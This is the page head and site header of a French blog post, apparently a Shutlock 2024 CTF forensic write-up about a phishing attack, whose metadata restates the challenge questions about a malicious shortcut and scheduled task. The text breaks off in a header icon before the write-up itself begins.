

<!DOCTYPE html>
<html lang="fr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="robots" content="index, follow">
<meta name="revisit-after" content="15 days"><link rel="author" href="/humans.txt">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" href="/favicon.ico" type="image/x-icon"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<meta name="msapplication-TileImage" content="/mstile-144x144.png">
<meta name="theme-color" content="#494f5c">
<meta name="msapplication-TileColor" content="#494f5c">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#494f5c"><meta name="author" content="Onirix"><meta name="description" content="Blog d&#39;Onirix">

  <meta itemprop="name" content="Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 1/2">
  <meta itemprop="description" content="Ceci est le write-up de la première partie du challenge Forensic Enquête sur le phishing des JO du CTF Shutlock édition 2024 organisé par la DGSI et EPITA.
Énoncé Mike O&#39;Soft a été averti d&#39;une campagne de phishing par le groupe THE HAMOR. Une des personnes ayant reçu le mail de phishing en question, s&#39;est faite piegée. Vous avez pour mission de mener l&#39;enquête. Heureusement pour vous, les équipes du ministère ont réalisé un dump mémoire sur la machine. Dans la suite de votre enquête, un dump réseau vous sera confié. Sauriez-vous retracer ce qu&#39;il s&#39;est passé sur ce poste ? Pour résoudre ce challenge, vous devez répondre aux questions suivantes : 1 - Quel est le nom du raccourci malveillant ? 2 - Quel est le nom de la scheduled task créé ? 3 - Quel script est lancé par cette scheduled task ? Format du flag SHLK{&#39;nom-fichier&#39;-&#39;scheduled task-&#39;script&#39;} Exemple: 1 - File : ctf\shutlock.test 2 - scheduled task : ScheduleTaskName 3 - script : ThisIsTheScript.sh SHLK{shutlock.test-ScheduleTaskName-ThisIsTheScript.sh} Il nous est alors donné un dump mémoire (dump.raw) ainsi que le screenshot du bureau du PC ci-dessous:">
  <meta itemprop="datePublished" content="2024-07-12T08:20:30+02:00">
  <meta itemprop="dateModified" content="2024-07-12T08:20:30+02:00">
  <meta itemprop="wordCount" content="2047">
  <meta itemprop="keywords" content="Shutlock 2024,Forensic,Phishing 1/2,Write-Up"><meta property="og:url" content="http://localhost:1313/posts/shutlock2024_phishing_1-2/shutlock2024_phishing_1-2/">
  <meta property="og:site_name" content="Onirix">
  <meta property="og:title" content="Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 1/2">
  <meta property="og:description" content="Ceci est le write-up de la première partie du challenge Forensic Enquête sur le phishing des JO du CTF Shutlock édition 2024 organisé par la DGSI et EPITA.
Énoncé Mike O&#39;Soft a été averti d&#39;une campagne de phishing par le groupe THE HAMOR. Une des personnes ayant reçu le mail de phishing en question, s&#39;est faite piegée. Vous avez pour mission de mener l&#39;enquête. Heureusement pour vous, les équipes du ministère ont réalisé un dump mémoire sur la machine. Dans la suite de votre enquête, un dump réseau vous sera confié. Sauriez-vous retracer ce qu&#39;il s&#39;est passé sur ce poste ? Pour résoudre ce challenge, vous devez répondre aux questions suivantes : 1 - Quel est le nom du raccourci malveillant ? 2 - Quel est le nom de la scheduled task créé ? 3 - Quel script est lancé par cette scheduled task ? Format du flag SHLK{&#39;nom-fichier&#39;-&#39;scheduled task-&#39;script&#39;} Exemple: 1 - File : ctf\shutlock.test 2 - scheduled task : ScheduleTaskName 3 - script : ThisIsTheScript.sh SHLK{shutlock.test-ScheduleTaskName-ThisIsTheScript.sh} Il nous est alors donné un dump mémoire (dump.raw) ainsi que le screenshot du bureau du PC ci-dessous:">
  <meta property="og:locale" content="fr">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-07-12T08:20:30+02:00">
    <meta property="article:modified_time" content="2024-07-12T08:20:30+02:00">
    <meta property="article:tag" content="Shutlock 2024">
    <meta property="article:tag" content="Forensic">
    <meta property="article:tag" content="Phishing 1/2">
    <meta property="article:tag" content="Write-Up">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 1/2">
  <meta name="twitter:description" content="Ceci est le write-up de la première partie du challenge Forensic Enquête sur le phishing des JO du CTF Shutlock édition 2024 organisé par la DGSI et EPITA.
Énoncé Mike O&#39;Soft a été averti d&#39;une campagne de phishing par le groupe THE HAMOR. Une des personnes ayant reçu le mail de phishing en question, s&#39;est faite piegée. Vous avez pour mission de mener l&#39;enquête. Heureusement pour vous, les équipes du ministère ont réalisé un dump mémoire sur la machine. Dans la suite de votre enquête, un dump réseau vous sera confié. Sauriez-vous retracer ce qu&#39;il s&#39;est passé sur ce poste ? Pour résoudre ce challenge, vous devez répondre aux questions suivantes : 1 - Quel est le nom du raccourci malveillant ? 2 - Quel est le nom de la scheduled task créé ? 3 - Quel script est lancé par cette scheduled task ? Format du flag SHLK{&#39;nom-fichier&#39;-&#39;scheduled task-&#39;script&#39;} Exemple: 1 - File : ctf\shutlock.test 2 - scheduled task : ScheduleTaskName 3 - script : ThisIsTheScript.sh SHLK{shutlock.test-ScheduleTaskName-ThisIsTheScript.sh} Il nous est alors donné un dump mémoire (dump.raw) ainsi que le screenshot du bureau du PC ci-dessous:">
<title>Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 1/2</title>
<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="http://localhost:1313/css/style.min.511344e1686b68a442b630060e75d8d46ff901c306eda7cf7acca8ebd97c37b4.css" integrity="sha256-URNE4WhraKRCtjAGDnXY1G/5AcMG7afPesyo69l8N7Q=" crossorigin="anonymous">
	</head>
<body id="page">
	<header id="site-header" class="animated slideInUp">
		<div class="hdr-wrapper section-inner">
			<div class="hdr-left">
				<div class="site-branding">
					<a href="http://localhost:1313/">Onirix</a>
				</div>
				<nav class="site-nav hide-in-mobile"><head>
	<style>
		.menu{
			display:flex;
			flex-direction: row;
		}

		.menu-item {
   			margin-right: 20px;
		}
	</style>
</head>
<div class="menu"><div class="menu-item">
			<a href="http://localhost:1313/posts/">Articles</a>
		</div><div class="menu-item">
			<a href="http://localhost:1313/categories/">Catégories</a>
		</div><div class="menu-item">
			<a href="http://localhost:1313/apropos">A propos</a>
		</div></div>
</nav>
			</div>
			<div class="hdr-right hdr-icons">
				<button id="toc-btn" class="hdr-btn desktop-only-ib" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list"><line x1="8" y1="6" x2="21" y2="6"></line><line x1="8" y1="12" x2="21" y2="12"></line><line x1="8" y1="18" x2="21" y2="18"></line><line x1="3" y1="6" x2="3" y2="6"></line><line x1="3" y1="12" x2="3" y2="12"></line><line x1="3" y1="18" x2="3" y2="18"></line></svg></button><span class="hdr-social hide-in-mobile"><a href="https://root-me.org/Onirix" target="_blank" rel="noopener me" title="Root me"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="15 20 20 10" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
    <g transform="matrix(Infinity NaN NaN Infinity 0 0)" id="50923579-270d-4d1a-9075-40d70aad8772"  >
    </g>
    <g transform="matrix(1 0 0 1 24 24)" id="eaa9c12f-b9b6-4657-81a3-97aa8372d3d2"  >
    <rect style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1; visibility: hidden;" vector-effect="non-scaling-stroke"  x="-24" y="-24" rx="0" ry="0" width="48" height="48" />
    </g>
    <g transform="matrix(0.04 0 0 0.04 24 24)"  >
    <g style="" vector-effect="non-scaling-stroke"   >
            <g transform="matrix(1 0 0 1 0 0)"  >
    <rect style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1; visibility: hidden;" vector-effect="non-scaling-stroke"  x="-540" y="-540" rx="0" ry="0" width="1080" height="1080" />
    </g>
            <g transform="matrix(1.89 0 0 1.89 0.28 155.42)"  >
    <path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" vector-effect="non-scaling-stroke"  transform=" translate(-296.95, -326.7)" d="M 299.2 319.9 C 299.2 319.9 299.2 319.9 299.2 319.9 C 299.09999999999997 319.79999999999995 299 319.7 299 319.59999999999997 C 298.9 319.49999999999994 298.9 319.49999999999994 298.8 319.4 C 298.8 319.4 298.8 319.4 298.8 319.4 C 298.7 319.4 298.7 319.29999999999995 298.6 319.29999999999995 C 298.5 319.19999999999993 298.40000000000003 319.19999999999993 298.3 319.09999999999997 C 298.2 319.09999999999997 298.1 318.99999999999994 298 318.99999999999994 C 297.9 318.99999999999994 297.8 318.8999999999999 297.8 318.8999999999999 C 297.7 318.8999999999999 297.6 318.8999999999999 297.5 318.7999999999999 C 297.4 318.7999999999999 297.3 318.7999999999999 297.2 318.7999999999999 C 297.09999999999997 318.7999999999999 297 318.7999999999999 296.9 318.7999999999999 C 296.79999999999995 318.7999999999999 296.7 318.7999999999999 296.59999999999997 318.7999999999999 C 296.49999999999994 318.7999999999999 296.4 318.7999999999999 296.29999999999995 318.7999999999999 C 296.19999999999993 318.7999999999999 296.09999999999997 318.7999999999999 295.99999999999994 318.8999999999999 C 295.8999999999999 318.8999999999999 295.79999999999995 318.99999999999994 295.79999999999995 318.99999999999994 C 295.69999999999993 318.99999999999994 295.59999999999997 319.09999999999997 295.49999999999994 319.09999999999997 C 295.3999999999999 319.09999999999997 295.29999999999995 319.2 295.19999999999993 319.29999999999995 C 295.0999999999999 319.29999999999995 295.0999999999999 319.4 294.99999999999994 319.4 C 294.99999999999994 319.4 294.99999999999994 319.4 294.99999999999994 319.4 C 294.8999999999999 319.5 294.8999999999999 319.5 294.79999999999995 319.59999999999997 C 294.69999999999993 319.7 294.59999999999997 319.79999999999995 294.59999999999997 319.79999999999995 C 294.59999999999997 319.79999999999995 294.59999999999997 319.79999999999995 294.59999999999997 319.79999999999995 L 286.49999999999994 329.9 C 285.49999999999994 331.2 285.69999999999993 333 286.99999999999994 334 C 287.49999999999994 334.4 288.19999999999993 334.6 288.79999999999995 334.6 C 289.69999999999993 334.6 290.49999999999994 334.20000000000005 291.09999999999997 333.5 L 291.2 333.4 C 294.2 329.7 299.8 329.7 302.7 333.4 L 302.8 333.5 C 303.40000000000003 334.2 304.2 334.6 305.1 334.6 C 305.70000000000005 334.6 306.40000000000003 334.40000000000003 306.90000000000003 334 C 308.20000000000005 333 308.40000000000003 331.1 307.40000000000003 329.9 z" stroke-linecap="round" />
    </g>
            <g transform="matrix(1.89 0 0 1.89 -62.81 -148.23)"  >
    <path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" vector-effect="non-scaling-stroke"  transform=" translate(-263.6, -166.2)" d="M 285.7 149.1 C 281.59999999999997 149.1 278.2 152.29999999999998 278 156.4 L 262.7 162 C 261.9 162.3 261.3 163 261.3 163.9 L 261.3 173.6 L 249 173.6 C 248.1 170.29999999999998 245.2 167.9 241.6 167.9 C 237.4 167.9 233.9 171.3 233.9 175.6 C 233.9 179.79999999999998 237.3 183.29999999999998 241.6 183.29999999999998 C 245.2 183.29999999999998 248.1 180.89999999999998 249 177.6 L 263.3 177.6 C 264.40000000000003 177.6 265.3 176.7 265.3 175.6 L 265.3 165.29999999999998 L 278.8 160.29999999999998 C 280.1 162.79999999999998 282.7 164.49999999999997 285.6 164.49999999999997 C 289.8 164.49999999999997 293.3 161.09999999999997 293.3 156.79999999999998 C 293.40000000000003 152.6 289.90000000000003 149.1 285.7 149.1 z" stroke-linecap="round" />
    </g>
            <g transform="matrix(1.89 0 0 1.89 -51.65 90.72)"  >
    <path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" vector-effect="non-scaling-stroke"  transform=" translate(-269.5, -292.5)" d="M 269.5 292.3 C 267 291.40000000000003 264.6 290.5 262.3 289.5 C 260.6 288.7 258.90000000000003 287.9 257.3 287.1 C 261.1 290.90000000000003 270.3 297.70000000000005 280.2 297.90000000000003 C 280.8 297.20000000000005 281.3 296.50000000000006 281.7 295.6 C 280.2 295.3 278.7 295 277.2 294.6 C 274.5 293.90000000000003 272 293.20000000000005 269.5 292.3 z" stroke-linecap="round" />
    </g>
            <g transform="matrix(1.89 0 0 1.89 0 0)"  >
    <path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" vector-effect="non-scaling-stroke"  transform=" translate(-296.8, -244.55)" d="M 395 222.5 C 395 217.8 394.7 213.1 394 208.6 C 394 208.29999999999998 393.9 208 393.9 207.7 C 387.79999999999995 168 357.7 135.39999999999998 318.09999999999997 126.69999999999999 C 317.09999999999997 122.19999999999999 313.09999999999997 118.79999999999998 308.29999999999995 118.79999999999998 C 302.69999999999993 118.79999999999998 298.19999999999993 123.29999999999998 298.19999999999993 128.89999999999998 C 298.19999999999993 133.7 301.5999999999999 137.7 306.0999999999999 138.7 L 306.0999999999999 175.6 C 306.0999999999999 176.2 306.3999999999999 176.79999999999998 306.8999999999999 177.2 C 307.19999999999993 177.39999999999998 307.5999999999999 177.5 307.99999999999994 177.5 C 308.19999999999993 177.5 308.49999999999994 177.5 308.69999999999993 177.4 L 323.49999999999994 171.8 C 324.49999999999994 173.3 325.99999999999994 174.3 327.79999999999995 174.8 L 327.79999999999995 192.20000000000002 C 320.29999999999995 201.4 310.99999999999994 209.70000000000002 301.09999999999997 217.10000000000002 L 289.79999999999995 190.90000000000003 C 291.9 189.50000000000003 293.29999999999995 187.20000000000005 293.29999999999995 184.50000000000003 C 293.29999999999995 180.30000000000004 289.9 176.80000000000004 285.59999999999997 176.80000000000004 C 281.4 176.80000000000004 277.9 180.20000000000005 277.9 184.50000000000003 C 277.9 188.70000000000002 281.29999999999995 192.20000000000002 285.59999999999997 192.20000000000002 C 285.7 192.20000000000002 285.9 192.20000000000002 285.99999999999994 192.20000000000002 L 297.79999999999995 219.50000000000003 C 290.9 224.50000000000003 283.79999999999995 229.00000000000003 276.79999999999995 233.10000000000002 L 243.2 223 C 242.79999999999998 222.9 242.39999999999998 222.9 242 223.1 L 232 227 C 230.6 225.1 228.4 223.9 225.8 223.9 C 221.60000000000002 223.9 218.10000000000002 227.3 218.10000000000002 231.6 C 218.10000000000002 235.79999999999998 221.50000000000003 239.29999999999998 225.8 239.29999999999998 C 230 239.29999999999998 233.5 235.89999999999998 233.5 231.6 C 233.5 231.29999999999998 233.4 231 233.4 230.7 L 242.8 227 L 272.1 235.8 C 247.10000000000002 249.8 224.70000000000002 257.90000000000003 221.00000000000003 259.2 L 219.20000000000002 259.8 C 217.60000000000002 258.6 215.60000000000002 257.90000000000003 213.4 257.90000000000003 C 213.3 257.90000000000003 213.20000000000002 257.90000000000003 213.1 257.90000000000003 C 208.4 246.80000000000004 206 234.70000000000005 206 222.60000000000002 C 206 216.60000000000002 206.6 210.70000000000002 207.7 205.00000000000003 L 251.6 205.00000000000003 C 252.5 208.30000000000004 255.4 210.70000000000002 259 210.70000000000002 C 263.2 210.70000000000002 266.7 207.3 266.7 203.00000000000003 C 266.7 198.80000000000004 263.3 195.30000000000004 259 195.30000000000004 C 255.4 195.30000000000004 252.5 197.70000000000005 251.6 201.00000000000003 L 208.6 201.00000000000003 C 216.7 168.10000000000002 242.7 141.8 276.3 134.00000000000003 C 278.1 136.90000000000003 281.3 138.90000000000003 284.90000000000003 138.90000000000003 C 290.50000000000006 138.90000000000003 295.00000000000006 134.40000000000003 295.00000000000006 128.80000000000004 C 295.00000000000006 123.20000000000005 290.50000000000006 118.70000000000005 284.90000000000003 118.70000000000005 C 280.00000000000006 118.70000000000005 276.00000000000006 122.20000000000005 275.00000000000006 126.70000000000005 C 230.90000000000006 136.70000000000005 198.60000000000005 176.40000000000003 198.60000000000005 222.40000000000003 C 198.60000000000005 235.50000000000003 201.20000000000005 248.60000000000002 206.30000000000004 260.6 C 204.40000000000003 262.40000000000003 203.30000000000004 265 203.30000000000004 267.8 C 203.30000000000004 272.3 206.20000000000005 276 210.20000000000005 277.40000000000003 L 210.20000000000005 316.8 C 210.20000000000005 317.5 210.40000000000003 318.2 210.80000000000004 318.8 L 213.00000000000003 320.3 L 242.90000000000003 341.40000000000003 L 242.90000000000003 366.6 C 242.90000000000003 368.70000000000005 244.60000000000002 370.40000000000003 246.70000000000005 370.40000000000003 L 346.70000000000005 370.40000000000003 C 348.80000000000007 370.40000000000003 350.50000000000006 368.70000000000005 350.50000000000006 366.6 L 350.50000000000006 341.40000000000003 L 380.50000000000006 320.3 L 382.70000000000005 318.7 C 383.1 318.09999999999997 383.30000000000007 317.4 383.30000000000007 316.7 L 383.30000000000007 277 C 387.00000000000006 275.5 389.6000000000001 271.9 389.6000000000001 267.7 C 389.6000000000001 265.09999999999997 388.6000000000001 262.7 387.00000000000006 260.9 C 392.30000000000007 248.99999999999997 395.00000000000006 235.79999999999998 395.00000000000006 222.49999999999997 z M 281.4 125.6 C 282.29999999999995 124.6 283.59999999999997 124 285 124 C 287.7 124 289.9 126.2 289.9 128.9 C 289.9 131.6 287.7 133.8 285 133.8 C 284 133.8 283.1 133.5 282.3 133 C 281 132.1 280.1 130.6 280.1 129 C 280.1 127.6 280.6 126.4 281.40000000000003 125.6 z M 303.4 128.79999999999998 C 303.4 126.09999999999998 305.59999999999997 123.89999999999998 308.29999999999995 123.89999999999998 C 309.69999999999993 123.89999999999998 310.9 124.49999999999997 311.79999999999995 125.39999999999998 C 312.59999999999997 126.29999999999998 313.09999999999997 127.39999999999998 313.09999999999997 128.7 C 313.09999999999997 130.29999999999998 312.29999999999995 131.79999999999998 310.99999999999994 132.7 C 310.19999999999993 133.29999999999998 309.29999999999995 133.6 308.19999999999993 133.6 C 305.5999999999999 133.7 303.3999999999999 131.5 303.3999999999999 128.79999999999998 z M 322.2 167.29999999999998 C 322.2 167.6 322.3 167.79999999999998 322.3 167.99999999999997 L 310.1 172.59999999999997 L 310.1 138.59999999999997 C 313.1 138.09999999999997 315.6 136.29999999999995 317 133.79999999999995 C 327.7 136.19999999999996 337.7 140.49999999999994 346.6 146.39999999999995 C 346.5 161.19999999999996 340.8 174.79999999999995 331.8 187.09999999999997 L 331.8 174.69999999999996 C 335.1 173.79999999999995 337.5 170.89999999999995 337.5 167.29999999999995 C 337.5 163.09999999999997 334.1 159.59999999999997 329.8 159.59999999999997 C 325.6 159.69999999999996 322.2 163.09999999999997 322.2 167.29999999999995 z M 213.5 272.7 C 212.3 272.7 211.2 272.2 210.3 271.5 C 209.3 270.6 208.60000000000002 269.3 208.60000000000002 267.9 C 208.60000000000002 267.29999999999995 208.70000000000002 266.7 208.90000000000003 266.2 C 209.60000000000002 264.4 211.40000000000003 263.09999999999997 213.40000000000003 263.09999999999997 C 214.30000000000004 263.09999999999997 215.10000000000002 263.4 215.80000000000004 263.79999999999995 C 217.20000000000005 264.59999999999997 218.20000000000005 266.19999999999993 218.20000000000005 267.99999999999994 C 218.20000000000005 268.8999999999999 217.90000000000003 269.69999999999993 217.50000000000006 270.3999999999999 C 216.80000000000007 271.7999999999999 215.30000000000007 272.69999999999993 213.50000000000006 272.69999999999993 z M 383.5 270.8 C 382.6 271.90000000000003 381.2 272.7 379.7 272.7 C 378.3 272.7 377.09999999999997 272.09999999999997 376.2 271.2 C 375.4 270.3 374.9 269.2 374.9 267.9 C 374.9 265.79999999999995 376.2 264 378.09999999999997 263.4 C 378.59999999999997 263.2 379.2 263.09999999999997 379.79999999999995 263.09999999999997 C 382.09999999999997 263.09999999999997 384.09999999999997 264.79999999999995 384.59999999999997 266.99999999999994 C 384.7 267.29999999999995 384.7 267.59999999999997 384.7 267.99999999999994 C 384.5 268.99999999999994 384.09999999999997 269.99999999999994 383.5 270.79999999999995 z M 380.5 257.8 C 380.2 257.8 379.9 257.8 379.6 257.8 C 374 257.8 369.5 262.3 369.5 267.90000000000003 C 369.5 272.20000000000005 372.2 275.90000000000003 376.1 277.3 L 376.1 314.1 L 344.6 336.3 C 343.6 337 343 338.2 343 339.40000000000003 L 343 360.6 C 343 361.8 342 362.8 340.8 362.8 L 329.1 362.8 C 327.90000000000003 362.8 326.90000000000003 361.8 326.90000000000003 360.6 L 326.90000000000003 353 C 326.90000000000003 351 325.50000000000006 349.2 323.50000000000006 349 C 321.20000000000005 348.8 319.30000000000007 350.6 319.30000000000007 352.8 L 319.30000000000007 360.7 C 319.30000000000007 361.9 318.30000000000007 362.9 317.1000000000001 362.9 L 302.80000000000007 362.9 C 301.6000000000001 362.9 300.6000000000001 361.9 300.6000000000001 360.7 L 300.6000000000001 349 C 300.6000000000001 347 299.2000000000001 345.2 297.2000000000001 345 C 294.9000000000001 344.8 293.0000000000001 346.6 293.0000000000001 348.8 L 293.0000000000001 360.8 C 293.0000000000001 362 292.0000000000001 363 290.8000000000001 363 L 276.5000000000001 363 C 275.3000000000001 363 274.3000000000001 362 274.3000000000001 360.8 L 274.3000000000001 353 C 274.3000000000001 351 272.90000000000015 349.2 270.90000000000015 349 C 268.60000000000014 348.8 266.70000000000016 350.6 266.70000000000016 352.8 L 266.70000000000016 360.7 C 266.70000000000016 361.9 265.70000000000016 362.9 264.50000000000017 362.9 L 252.80000000000018 362.9 C 251.6000000000002 362.9 250.6000000000002 361.9 250.6000000000002 360.7 L 250.6000000000002 339.5 C 250.6000000000002 338.3 250.0000000000002 337.1 249.0000000000002 336.4 L 217.6 314.2 L 217.6 277 C 221.1 275.4 223.5 271.9 223.5 267.8 C 223.5 267.2 223.4 266.6 223.3 266 C 227.3 264.6 257.8 253.7 287.8 235 C 328.40000000000003 209.7 350.90000000000003 181 353.5 151.5 C 371 165.6 383.1 186 386.6 208.9 C 386.1 259 298.8 289.9 297.90000000000003 290.2 C 297.70000000000005 290.3 297.20000000000005 290.4 296.8 290.59999999999997 C 295.7 290.4 294.6 290.2 293.40000000000003 289.99999999999994 C 292.6 289.79999999999995 291.70000000000005 289.69999999999993 290.90000000000003 289.49999999999994 C 289.6 289.29999999999995 288.3 288.99999999999994 287.00000000000006 288.69999999999993 C 286.80000000000007 288.5999999999999 286.50000000000006 288.5999999999999 286.30000000000007 288.5999999999999 C 285.80000000000007 288.4999999999999 285.30000000000007 288.3999999999999 284.80000000000007 288.2999999999999 C 284.20000000000005 288.1999999999999 283.6000000000001 287.9999999999999 283.00000000000006 287.8999999999999 C 281.6000000000001 287.5999999999999 280.20000000000005 287.2999999999999 278.90000000000003 286.8999999999999 C 276.40000000000003 286.2999999999999 274.00000000000006 285.5999999999999 271.6 284.99999999999994 C 269.3 284.29999999999995 266.90000000000003 283.69999999999993 264.70000000000005 282.99999999999994 C 264.6 282.99999999999994 264.6 282.99999999999994 264.50000000000006 282.99999999999994 C 262.80000000000007 282.49999999999994 261.20000000000005 281.99999999999994 259.6000000000001 281.3999999999999 C 259.1000000000001 281.19999999999993 258.50000000000006 280.99999999999994 258.00000000000006 280.8999999999999 C 257.20000000000005 280.5999999999999 256.50000000000006 280.3999999999999 255.80000000000007 280.19999999999993 C 254.50000000000006 279.79999999999995 253.30000000000007 279.3999999999999 252.20000000000007 278.8999999999999 C 252.20000000000007 278.8999999999999 252.10000000000008 278.8999999999999 252.10000000000008 278.8999999999999 C 250.30000000000007 278.2999999999999 248.70000000000007 277.69999999999993 247.30000000000007 277.0999999999999 C 245.80000000000007 276.4999999999999 244.50000000000006 275.9999999999999 243.50000000000006 275.5999999999999 C 242.50000000000006 275.0999999999999 241.60000000000005 274.7999999999999 241.10000000000005 274.4999999999999 C 240.50000000000006 274.1999999999999 240.20000000000005 274.0999999999999 240.20000000000005 274.0999999999999 C 240.20000000000005 274.0999999999999 240.40000000000003 274.3999999999999 240.80000000000004 274.7999999999999 C 241.20000000000005 275.2999999999999 241.80000000000004 275.9999999999999 242.70000000000005 276.7999999999999 C 243.50000000000006 277.5999999999999 244.60000000000005 278.5999999999999 245.90000000000003 279.5999999999999 C 247.20000000000005 280.5999999999999 248.70000000000005 281.69999999999993 250.30000000000004 282.7999999999999 C 250.30000000000004 282.7999999999999 250.30000000000004 282.7999999999999 250.40000000000003 282.7999999999999 C 249.80000000000004 284.7999999999999 249.40000000000003 286.9999999999999 249.40000000000003 289.1999999999999 C 249.40000000000003 300.6999999999999 258.8 310.09999999999985 270.3 310.09999999999985 C 279.2 310.09999999999985 286.8 304.49999999999983 289.8 296.59999999999985 C 290.8 296.6999999999999 291.90000000000003 296.79999999999984 292.90000000000003 296.89999999999986 C 294.70000000000005 296.9999999999999 296.40000000000003 296.9999999999999 298.00000000000006 296.9999999999999 C 298.1000000000001 296.9999999999999 298.20000000000005 297.0999999999999 298.30000000000007 297.0999999999999 L 315.20000000000005 314.2999999999999 C 319.50000000000006 318.5999999999999 326.20000000000005 319.2999999999999 331.20000000000005 315.9999999999999 L 357.6 301.1999999999999 C 359.90000000000003 299.6999999999999 361.40000000000003 297.09999999999985 361.40000000000003 294.2999999999999 L 361.40000000000003 263.8999999999999 C 371.6 255.79999999999993 380.8 246.19999999999993 386.8 235.29999999999993 C 385.7 243.19999999999993 383.6 250.69999999999993 380.5 257.79999999999995 z M 281.7 295.6 C 281.3 296.40000000000003 280.7 297.20000000000005 280.2 297.90000000000003 L 280.2 297.90000000000003 C 277.8 300.70000000000005 274.2 302.50000000000006 270.2 302.50000000000006 C 266.2 302.50000000000006 262.59999999999997 300.70000000000005 260.2 297.90000000000003 C 258.2 295.6 257.09999999999997 292.6 257.09999999999997 289.40000000000003 C 257.09999999999997 288.6 257.2 287.90000000000003 257.29999999999995 287.1 C 257.29999999999995 287.1 257.29999999999995 287.1 257.29999999999995 287.1 C 258.9 287.90000000000003 260.59999999999997 288.70000000000005 262.29999999999995 289.5 C 264.59999999999997 290.5 266.99999999999994 291.5 269.49999999999994 292.3 C 271.99999999999994 293.2 274.59999999999997 293.90000000000003 277.19999999999993 294.6 C 278.69999999999993 295 280.19999999999993 295.3 281.69999999999993 295.6 z" stroke-linecap="round" />
    </g>
    </g>
    </g>
</svg></a><a href="https://github.com/0xOnirix" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a><a href="mailto:onirix.contact@protonmail.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://discord.com/users/275297786184859648" target="_blank" rel="noopener me" title="Discord"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M8.82889 11.203C7.86239 11.203 7.09937 12.0508 7.09937 13.0852C7.09937 14.1195 7.87935 14.9673 8.82889 14.9673C9.79538 14.9673 10.5584 14.1195 10.5584 13.0852C10.5754 12.0508 9.79538 11.203 8.82889 11.203ZM15.0178 11.203C14.0514 11.203 13.2883 12.0508 13.2883 13.0852C13.2883 14.1195 14.0683 14.9673 15.0178 14.9673C15.9843 14.9673 16.7474 14.1195 16.7474 13.0852C16.7474 12.0508 15.9843 11.203 15.0178 11.203Z" fill="currentColor"/><path d="M14.8477 18.3649C14.8874 18.4483 14.9381 18.5296 15.0005 18.6075C15.3663 19.0644 15.7387 19.5135 15.8832 19.687C16.1242 19.9764 16.4855 20.1329 16.8553 20.117C20.6839 19.9522 22.4053 17.6063 22.7126 17.1342C22.8526 16.919 22.9029 16.6887 22.9023 16.4867C22.8862 11.0873 20.6126 6.69288 20.3618 6.22299C20.2686 6.04849 20.1448 5.9213 20.0223 5.83024C17.6324 4.05442 15.3398 3.89258 14.7987 3.87945C14.4248 3.87037 14.1018 4.039 13.8908 4.28019C13.7833 4.40298 13.7069 4.53817 13.659 